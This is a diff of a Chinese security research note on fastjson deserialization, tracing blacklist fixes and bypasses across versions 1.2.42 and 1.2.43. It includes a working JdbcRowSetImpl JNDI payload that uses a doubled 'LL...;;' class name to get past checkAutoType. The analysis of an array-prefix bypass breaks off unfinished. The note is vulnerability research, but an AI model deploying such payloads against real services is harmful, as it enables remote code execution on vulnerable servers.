@@ -1100,11 +1100,44 @@ JSON#parseObject(String text, Class<T> clazz)
 
 ![image-20250206141949135](./images/image-20250206141949135.png)
 
-**修复：**
+在黑明名单校验时，也是使用hashcode进行校验
+
+![image-20250207111125536](./images/image-20250207111125536.png)
+
+这就对fastjson的安全研究带来了新的问题，我们不知道这些hashcode对应的黑白名单具体是什么类，这里给出一个项目，解决了这个问题，其中研究了hashcode和类的对应关系：[LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)
+
+**修复：**checkAutoType中检查类名是否以`L`开头，是的话，将去除类名第一个和最后一个字符
+
+![image-20250207145312281](./images/image-20250207145312281.png)
+
+**绕过：**双写`L;`
+
+**Payload：**
+
+```java
+String fastSer =  "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
+JSON.parseObject(fastSer);
+// 在开启autoTypeSupport的情况下，显示指定expectClass只要为JdbcRowSetImpl父类也不影响Payload
+```
+
+##### fastjson 1.2.43
+
+**修复：**如果类名为`L.....;`&`LL......`的形式，则抛出异常
+
+![image-20250207181039093](./images/image-20250207181039093.png)
+
+**绕过：**loadClass的解析特性，使得我们有一种方法对于黑名单的绕过，回到loadClass，可以发现，除了对于`L......;`这样的类名的支持，对于`[`开头的类名，该方法也做了特殊的处理。
+
+![image-20250207152617418](./images/image-20250207152617418.png)
+
+不过这里可以看出，返回的是一个数组类型，后续是否可以利用，还是需要看一下返回后的代码逻辑。
+
+这里我们先要分析一下，如何让loadClass获取到以`[`开头的类名，这并不是一个很明了的问题，
 
 ### 补充一下其他利用链
 
-
+### Payload一览
 
 ### 探测
 
